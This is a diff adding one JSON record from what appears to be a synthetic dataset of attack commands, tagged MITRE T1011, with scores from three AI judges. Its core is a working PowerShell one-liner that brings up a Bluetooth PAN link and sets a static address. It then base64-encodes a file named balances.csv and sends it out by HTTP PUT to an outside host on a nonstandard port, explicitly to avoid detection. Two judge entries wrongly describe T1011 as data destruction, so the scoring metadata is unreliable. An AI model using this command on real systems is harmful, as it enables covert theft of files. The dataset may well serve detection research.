@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Documents\\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null",
+  "explanation": "Uses HTTP PUT to a custom port over a Bluetooth PAN-isolated subnet to exfiltrate base64 data, aligning with exfiltration over another network medium (T1011).",
+  "rationale_steps": [
+    "Establish Bluetooth PAN connectivity using a Bluetooth manipulation tool.",
+    "Assign a static /30 address to the Bluetooth interface with netsh.",
+    "Send base64 data using HTTP on a nonstandard port to reduce detection.",
+    "Destination IP is only reachable over Bluetooth, forcing that medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-92ef89c1",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignment, pipeline operations, and method invocations.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns with T1011 (Exfiltration Over Other Network Medium) by establishing a Bluetooth PAN connection and exfiltrating data over it, though it's focused on exfiltration rather than the claimed T1011 technique of data destruction.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:47:06.762547Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes and parentheses, correct PowerShell syntax for pipelines, variable assignments, .NET method calls, and external command execution.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration by reading a file and sending its base64 content via HTTP PUT, which is entirely unrelated to, and semantically opposite of, the specified T1011 Data Destruction technique.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:47:13.668634Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell pipeline is well-formed with balanced quotes, correct separators, valid expressions, and properly constructed hashtables.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly connects to a Bluetooth PAN, sets an interface IP, base64-encodes a file, and exfiltrates it via HTTP PUT over that medium, though the netsh static IP step likely requires admin privileges and may fail in practice.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T01:47:54.005024Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
